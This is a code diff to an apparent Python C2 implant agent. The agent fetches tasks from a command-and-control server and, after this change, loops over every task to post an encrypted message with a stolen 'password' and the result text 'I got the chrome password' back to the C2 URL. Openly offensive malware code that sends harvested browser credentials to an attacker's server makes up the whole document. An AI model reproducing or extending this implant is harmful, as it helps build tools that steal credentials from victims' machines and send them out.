@@ -87,6 +87,7 @@ def get_task():
 
             print("[+] Got task from C2 server")
             # parse list of task
+            global task_ls
             task_ls = resp["tasks"]
             for task in task_ls:
                 print("[+] Job ID:", task["job_id"])
@@ -105,23 +106,27 @@ def send_results():
     """
         send the results to the C2 server
     """
-    global latest_job_id
-    results = "I got the chrome password"
-    data = {"agent_id": agent_id, "job_id": latest_job_id,"password": password, "results": results}
+    global task_ls
+    global agent_id
+    for task in task_ls:
+        results = "I got the chrome password"
+        print(task)
+        data = {"agent_id": agent_id,"job_id": task["job_id"],"password": password, "results": results}
 
-    print("[+] Sending results to C2 server...")
-    r = requests.post(c2_url + send_results_uri, data=encrypt_data(data))
-    if r.status_code == 200:
-        resp = decrypt_data(r.content)
-        if resp["status"] == "ok":
-            print("[+] Results sent to C2 server")
-            return True
+        print("[+] Sending results to C2 server...")
+        r = requests.post(c2_url + send_results_uri, data=encrypt_data(data))
+        print(r.status_code)
+        if r.status_code == 200:
+            resp = decrypt_data(r.content)
+            if resp["status"] == "ok":
+                print("[+] Results sent to C2 server")
+                # return True
+            else:
+                print("[-] Agent failed to send results to C2", resp)
+                # return False
         else:
-            print("[-] Agent failed to send results to C2", resp)
-            return False
-    else:
-        print("[-] Agent failed to send results to C2")
-        return False
+            print("[-] Agent failed to send results to C2")
+            # return False
 
 if __name__ == "__main__":
     register()
